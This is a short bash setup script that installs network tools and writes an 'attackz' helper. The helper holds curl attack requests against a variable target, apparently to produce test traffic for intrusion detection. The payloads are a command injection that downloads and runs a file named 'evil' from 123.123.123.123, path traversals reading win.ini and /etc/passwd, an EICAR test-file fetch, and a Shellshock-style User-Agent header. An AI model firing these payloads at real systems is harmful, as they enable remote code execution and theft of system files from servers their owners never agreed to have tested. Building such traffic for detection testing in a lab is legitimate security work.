#! /bin/bash

apt update
apt install -y tcpdump fping dnsutils netsniff-ng apache2-utils wrk netcat

cat <<EOF > /usr/local/bin/attackz
curl "http://${TARGET}/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
curl http://${TARGET}/?item=../../../../WINNT/win.ini
curl http://${TARGET}/eicar.file
curl http://${TARGET}/cgi-bin/../../../..//bin/cat%20/etc/passwd
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://${TARGET}/cgi-bin/test-critical
EOF
chmod a+x /usr/local/bin/attackz
